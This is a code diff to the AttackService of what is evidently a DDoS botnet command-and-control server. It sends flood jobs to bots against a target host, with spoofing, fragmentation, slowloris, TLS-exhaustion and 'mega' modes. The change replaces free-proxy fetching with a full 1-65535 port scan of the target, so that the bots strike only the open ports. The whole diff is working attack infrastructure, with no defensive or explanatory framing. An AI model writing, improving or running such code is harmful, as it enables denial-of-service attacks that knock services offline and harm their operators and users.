@@ -142,7 +142,7 @@ class AttackService:
                         user_id=user.id,
                         target_host=data.target_host,
                         target_port=data.target_port,
-                        method=method,
+                        method=data.method,
                         duration_secs=data.duration_secs,
                         pps_per_bot=data.pps_per_bot,
                         bot_count=min(data.bot_count, max_concurrent),
@@ -175,13 +175,35 @@ class AttackService:
 
             method = data.method.upper()
 
-            # Auto-fetch free proxies for HTTP_PROXY if not provided
+            # HTTP/TLS now hit origin directly (connection pool + slowloris drip)
+            # — no proxy chain needed, bot ignores proxies field.
             proxy_list = data.proxies or ""
-            if method == "HTTP_PROXY" and not proxy_list:
+
+            # ── Port list for bots ─────────────────────────────────────────
+            # Default: only user-set target_port (+ optional extra_ports).
+            # scan_ports=True: C2 full-scans 1..65535, bots only hit open ports.
+            extras = [data.target_port]
+            if getattr(data, "extra_ports", None):
+                for tok in (data.extra_ports or "").replace(" ", "").split(","):
+                    if tok.isdigit():
+                        extras.append(int(tok))
+            open_ports_str = ",".join(str(p) for p in sorted(set(extras)))
+
+            if getattr(data, "scan_ports", False):
+                from app.services.port_scanner import scan_ports, format_ports
                 try:
-                    proxy_list = await fetch_free_proxies(limit=500)
+                    found = await scan_ports(
+                        data.target_host,
+                        full=True,
+                        include_always=extras,
+                        concurrency=1000,
+                        timeout=0.3,
+                    )
+                    if found:
+                        open_ports_str = format_ports(found)
+                        print(f"[atk] scan {data.target_host}: {len(found)} open → bots")
                 except Exception as e:
-                    print(f"[proxy] Auto-fetch failed: {e}")
+                    print(f"[atk] scan failed: {e}, fallback to ports {open_ports_str}")
 
             delivered = 0
             for bot in available:
@@ -197,10 +219,11 @@ class AttackService:
                         "spoof_mode": data.spoof_mode,
                         "fragmentation": int(data.fragmentation),
                         "slowloris": int(data.slowloris or method == "SLOWLORIS"),
-                        "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
-                        "mega_mode": int(data.mega_mode or method == "MEGA"),
+                        "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST" or method == "TLS"),
+                        "mega_mode": int(data.mega_mode or method == "PSPE" or method == "MEGA"),
                         "payload": data.payload or "",
                         "proxies": proxy_list,
+                        "open_ports": open_ports_str,  # "80,443,3389,1433,..."
                     })
                     delivered += 1
                 except Exception as e:
